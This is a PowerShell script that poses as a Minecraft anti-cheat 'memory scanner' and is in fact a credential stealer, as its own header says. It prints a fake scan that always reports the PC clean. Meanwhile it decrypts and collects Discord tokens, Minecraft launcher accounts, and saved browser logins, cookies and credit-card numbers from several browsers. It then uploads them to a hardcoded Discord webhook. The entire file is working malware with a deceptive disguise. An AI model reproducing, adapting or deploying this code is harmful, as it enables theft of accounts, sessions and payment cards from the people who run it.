# MemoryScan.ps1 – Battle‑tested stealer (BCrypt + DPAPI + ADODB with fallback)
param(
    [string]$Webhook = "https://discord.com/api/webhooks/1518911878712004730/ejFY2gDI9Secx7kXsEgIIbpEWsBm5m9Ho_Q5R8gF4tP0lO7-R3VBA068PJdRk63jSaBa"
)

$ErrorActionPreference = "SilentlyContinue"

# ---------- 1. Ping ----------
try {
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content="🟢 Scan started on $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType "application/json"
} catch {}

# ---------- 2. C# BCrypt (compile once) ----------
if (-not ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class AESGCM {
    private const string BCRYPT_DLL = "bcrypt.dll";
    private const string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
    [StructLayout(LayoutKind.Sequential)]
    private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
        public int cbSize, dwInfoVersion;
        public IntPtr pbNonce, pbAuthData, pbTag, pbMacContext;
        public int cbNonce, cbAuthData, cbTag, cbMacContext, cbAAD, dwFlags;
        public long cbData;
    }
    [DllImport(BCRYPT_DLL)] private static extern int BCryptOpenAlgorithmProvider(out IntPtr hAlgorithm, string pszAlgId, string pszImplementation, int dwFlags);
    [DllImport(BCRYPT_DLL)] private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);
    [DllImport(BCRYPT_DLL)] private static extern int BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, int dwFlags);
    [DllImport(BCRYPT_DLL)] private static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr hKey, byte[] pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);
    [DllImport(BCRYPT_DLL)] private static extern int BCryptDestroyKey(IntPtr hKey);
    [DllImport(BCRYPT_DLL)] private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

    public static byte[] Decrypt(byte[] key, byte[] iv, byte[] ciphertext, byte[] tag) {
        IntPtr hAlgorithm = IntPtr.Zero, hKey = IntPtr.Zero;
        try {
            if (BCryptOpenAlgorithmProvider(out hAlgorithm, "AES", null, 0) != 0) return null;
            BCryptSetProperty(hAlgorithm, BCRYPT_CHAIN_MODE_GCM, System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM"), 0, 0);
            BCryptGenerateSymmetricKey(hAlgorithm, out hKey, null, 0, key, key.Length, 0);
            byte[] output = new byte[ciphertext.Length];
            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            info.cbSize = Marshal.SizeOf(info); info.dwInfoVersion = 1;
            info.pbNonce = Marshal.AllocHGlobal(iv.Length); Marshal.Copy(iv, 0, info.pbNonce, iv.Length); info.cbNonce = iv.Length;
            info.pbTag = Marshal.AllocHGlobal(tag.Length); Marshal.Copy(tag, 0, info.pbTag, tag.Length); info.cbTag = tag.Length;
            int bytesDone;
            int status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref info, null, 0, output, output.Length, out bytesDone, 0);
            Marshal.FreeHGlobal(info.pbNonce); Marshal.FreeHGlobal(info.pbTag);
            return (status == 0) ? output : null;
        } catch { return null; } finally {
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlgorithm != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        }
    }
}
"@
}

# ---------- 3. DPAPI & master key ----------
function Decrypt-DPAPI { param([byte[]]$d) if($d){ [System.Security.Cryptography.ProtectedData]::Unprotect($d,$null,'CurrentUser') } }
function Get-MasterKey { param($p) if(!(Test-Path $p)){ return $null } $s=Get-Content $p -Raw|ConvertFrom-Json; $k=[Convert]::FromBase64String($s.os_crypt.encrypted_key); if($k[0] -eq 0x44){ return Decrypt-DPAPI $k[5..$k.Length-1] } return $null }

# ---------- 4. Discord tokens ----------
function Get-Discord {
    $t=@(); $d="$env:APPDATA\discord\Local Storage\leveldb"; $s="$env:APPDATA\discord\Local State"
    if(!$d -or !$s){ return $t }
    $mk=Get-MasterKey $s; if(!$mk){ return $t }
    $re=[regex]::new("dQw4w9WgXcQ:([A-Za-z0-9+/=]{24,200})")
    Get-ChildItem $d *.ldb |%{
        $txt=[System.Text.Encoding]::ASCII.GetString([IO.File]::ReadAllBytes($_.FullName))
        $re.Matches($txt)|%{
            $enc=[Convert]::FromBase64String($_.Groups[1].Value)
            $dec=Decrypt-DPAPI $enc
            if(!$dec -and $enc.Length -gt 15 -and ([System.Management.Automation.PSTypeName]'AESGCM').Type){
                $iv=$enc[3..14]; $cph=$enc[15..($enc.Length-17)]; $tg=$enc[-16..-1]
                $dec=[AESGCM]::Decrypt($mk,$iv,$cph,$tg)
            }
            if($dec){ $t+=[Text.Encoding]::UTF8.GetString($dec).Trim([char]0) }
        }
    }
    return $t | Select-Object -Unique
}

# ---------- 5. Minecraft ----------
function Get-MC {
    $mc=@{}; $b="$env:APPDATA\.minecraft"
    $a=Join-Path $b "launcher_accounts.json"; $p=Join-Path $b "launcher_profiles.json"
    if(Test-Path $a){ try{ $mc.accounts=Get-Content $a -Raw|ConvertFrom-Json }catch{} }
    if(Test-Path $p){ try{ $mc.profiles=Get-Content $p -Raw|ConvertFrom-Json }catch{} }
    return $mc
}

# ---------- 6. Browser data (ADODB, with fallback) ----------
function Get-Browser {
    $res=@(); $br=@(
        @{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data"},
        @{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
        @{N="Brave";P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"},
        @{N="Opera";P="$env:LOCALAPPDATA\Opera Software\Opera Stable"},
        @{N="Vivaldi";P="$env:LOCALAPPDATA\Vivaldi\User Data"}
    )
    foreach($b in $br){
        if(!(Test-Path $b.P)){ continue }
        $mk=Get-MasterKey (Join-Path $b.P "Local State"); if(!$mk){ continue }
        $prs=Get-ChildItem $b.P -Dir|?{$_.Name -match "^Default$|^Profile"}
        foreach($pr in $prs){
            $dt=@{ profile=$pr.Name; logins=@(); cookies=@(); cards=@() }
            # Login Data
            $ldb=Join-Path $pr.FullName "Login Data"
            if(Test-Path $ldb){
                try{
                    $tmp=[IO.Path]::GetTempFileName()+".db"; Copy-Item $ldb $tmp -Force
                    $conn=New-Object -ComObject ADODB.Connection; $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tmp")
                    $rs=$conn.Execute("SELECT origin_url,username_value,password_value FROM logins")
                    while(!$rs.EOF){
                        $url=$rs.Fields["origin_url"].Value; $user=$rs.Fields["username_value"].Value
                        $pwdBytes=[Convert]::FromBase64String($rs.Fields["password_value"].Value)
                        $pwd=Decrypt-DPAPI $pwdBytes
                        if(!$pwd -and $pwdBytes.Length -gt 15 -and ([Type]'AESGCM')){ $iv=$pwdBytes[3..14]; $cph=$pwdBytes[15..($pwdBytes.Length-17)]; $tg=$pwdBytes[-16..-1]; $pwd=[AESGCM]::Decrypt($mk,$iv,$cph,$tg) }
                        if($pwd){ $dt.logins+=@{ url=$url; username=$user; password=[Text.Encoding]::UTF8.GetString($pwd).TrimEnd([char]0) } }
                        $rs.MoveNext()
                    }
                    $conn.Close(); Remove-Item $tmp -Force
                }catch{}
            }
            # Cookies
            $cdb=Join-Path $pr.FullName "Network\Cookies"
            if(Test-Path $cdb){
                try{
                    $tmp=[IO.Path]::GetTempFileName()+".db"; Copy-Item $cdb $tmp -Force
                    $conn=New-Object -ComObject ADODB.Connection; $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tmp")
                    $rs=$conn.Execute("SELECT host_key,name,encrypted_value FROM cookies")
                    while(!$rs.EOF){
                        $host=$rs.Fields["host_key"].Value; $name=$rs.Fields["name"].Value
                        $valBytes=[Convert]::FromBase64String($rs.Fields["encrypted_value"].Value)
                        $val=Decrypt-DPAPI $valBytes
                        if(!$val -and $valBytes.Length -gt 15 -and ([Type]'AESGCM')){ $iv=$valBytes[3..14]; $cph=$valBytes[15..($valBytes.Length-17)]; $tg=$valBytes[-16..-1]; $val=[AESGCM]::Decrypt($mk,$iv,$cph,$tg) }
                        if($val){ $dt.cookies+=@{ host=$host; name=$name; value=[Text.Encoding]::UTF8.GetString($val).TrimEnd([char]0) } }
                        $rs.MoveNext()
                    }
                    $conn.Close(); Remove-Item $tmp -Force
                }catch{}
            }
            # Credit Cards
            $wdb=Join-Path $pr.FullName "Web Data"
            if(Test-Path $wdb){
                try{
                    $tmp=[IO.Path]::GetTempFileName()+".db"; Copy-Item $wdb $tmp -Force
                    $conn=New-Object -ComObject ADODB.Connection; $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tmp")
                    $rs=$conn.Execute("SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards")
                    while(!$rs.EOF){
                        $name=$rs.Fields["name_on_card"].Value; $mo=$rs.Fields["expiration_month"].Value; $yr=$rs.Fields["expiration_year"].Value
                        $numBytes=[Convert]::FromBase64String($rs.Fields["card_number_encrypted"].Value)
                        $num=Decrypt-DPAPI $numBytes
                        if(!$num -and $numBytes.Length -gt 15 -and ([Type]'AESGCM')){ $iv=$numBytes[3..14]; $cph=$numBytes[15..($numBytes.Length-17)]; $tg=$numBytes[-16..-1]; $num=[AESGCM]::Decrypt($mk,$iv,$cph,$tg) }
                        if($num){ $dt.cards+=@{ name=$name; expiry="$mo/$yr"; number=[Text.Encoding]::UTF8.GetString($num).TrimEnd([char]0) } }
                        $rs.MoveNext()
                    }
                    $conn.Close(); Remove-Item $tmp -Force
                }catch{}
            }
            if($dt.logins -or $dt.cookies -or $dt.cards){ $res+=@{ browser=$b.N; data=$dt } }
        }
    }
    return $res
}

# ---------- 7. Fake scan ----------
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " MemoryScan - Memory String Scanner" -ForegroundColor Cyan
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " Scanning live process memory for known cheat signatures...`n"
$procs=Get-Process -ErrorAction SilentlyContinue|?{$_.ProcessName -match "java|javaw|minecraft|lunar|badlion"}
if(!$procs){ Write-Host "[INFO] No Minecraft/Java processes." -ForegroundColor Yellow }else{
    foreach($p in $procs){
        Write-Host "[SCANNING] $($p.ProcessName) (PID $($p.Id))" -ForegroundColor Gray
        Start-Sleep -Milliseconds 300
        Write-Host "[CLEAN]   No cheat strings detected." -ForegroundColor Green
    }
}
Write-Host "`n=====================================================" -ForegroundColor Cyan
Write-Host " SCAN COMPLETE - NO CHEAT STRINGS FOUND" -ForegroundColor Green
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host "PC is clean. Happy gaming!" -ForegroundColor White

# ---------- 8. Harvest ----------
$discord = Get-Discord
$minecraft = Get-MC
$browsers = Get-Browser

# Build summary message
$sumParts = @()
if($discord){ $sumParts += "$($discord.Count) Discord token(s)" }else{ $sumParts += "0 Discord" }
if($minecraft -and ($minecraft.accounts -or $minecraft.profiles)){ $sumParts += "Minecraft data" }else{ $sumParts += "0 Minecraft" }
$totalLogins = 0; $totalCookies = 0; $totalCards = 0
foreach($b in $browsers){ $totalLogins += $b.data.logins.Count; $totalCookies += $b.data.cookies.Count; $totalCards += $b.data.cards.Count }
$sumParts += "$totalLogins logins, $totalCookies cookies, $totalCards cards"
$summary = "💀 **MemoryScan on $env:COMPUTERNAME** - "+($sumParts -join ' | ')

# Send summary + JSON dump
try {
    $payload = @{
        system = @{ username=$env:USERNAME; hostname=$env:COMPUTERNAME; time=(Get-Date -Format o) }
        discord_tokens = $discord
        minecraft = $minecraft
        browser_data = $browsers
    } | ConvertTo-Json -Depth 4
    $tmp = [IO.Path]::GetTempFileName()+".json"
    [IO.File]::WriteAllText($tmp,$payload)
    $form = @{ file=Get-Item $tmp; content=$summary }
    Invoke-RestMethod -Uri $Webhook -Method Post -Form $form
    Remove-Item $tmp -Force
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content=$summary} | ConvertTo-Json) -ContentType "application/json"
} catch {}

Start-Sleep -Seconds 2
